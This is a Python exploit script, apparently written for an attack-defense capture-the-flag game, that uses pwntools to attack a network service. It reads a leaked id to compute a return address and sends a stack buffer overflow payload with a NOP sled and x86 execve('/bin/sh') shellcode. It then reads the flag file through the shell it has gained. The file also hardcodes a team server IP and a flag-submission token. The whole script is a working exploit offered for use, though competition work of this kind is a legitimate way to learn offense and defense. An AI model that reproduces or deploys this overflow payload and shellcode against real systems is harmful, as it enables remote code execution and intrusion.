#!/usr/bin/env python

import swpag_client
import pwn

URL = "52.37.204.0"
TEAM_URL = "http://" + URL + "/"
TEAM_FLAG_TOKEN = "nt4yw7LjoPFc2WE49cLG"
SERVICE_ID = 4 # Update for each exploit to target the correct service

def main():
  team = swpag_client.Team(TEAM_URL, TEAM_FLAG_TOKEN)

  # for target in team.get_targets(SERVICE_ID):
  # flag_id = target["flag_id"]
  # hostname = target["hostname"]
  # port = target["port"]

  flag_id = '2658873307'
  hostname = 'localhost'
  port = 10004

  print("Running exploit on {0}:{1} -> {2}".format(hostname, port, flag_id))

  flag_obtained = None
    
  offset = 48
  try:
    process = pwn.remote(hostname, int(port))
    process.readuntil('id ')
    execution_id = process.readuntil(')')
    execution_id = int(execution_id[0:10]) 
    execution_id = execution_id - offset
    big_endian = str(pwn.p32(execution_id))
    print(big_endian)
    process.readuntil('?')
    process.wait(0.5)
    process.write('R\n')
    process.wait(0.5)
    process.readuntil('password\n') 
    process.wait(0.5)
    process.write('1 ' + 'A'*80 + big_endian + '\x90'*40 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x4b\x2c\x40\xcd\x80' + '\n')
    process.wait(0.5)
    process.send('\n')
    process.wait(0.5)
    process.send('\n')
    process.wait(0.5)
    process.readuntil('password!')
    process.wait(0.5)
    process.send('\n')
    process.wait(0.5)
    process.send('\n')
    process.wait(0.5)
    print('cat ' + flag_id) 
    print(process.send("cat " + flag_id + "\n"))
    process.wait(0.5)
    flags = process.recvall(timeout=2).strip("\r\n")
    print(flags)
    # print(team.submit_flag(flags))
    process.close()

  except Exception as e:
    print(e)
    process.close()
    

if __name__ == "__main__":
  main()
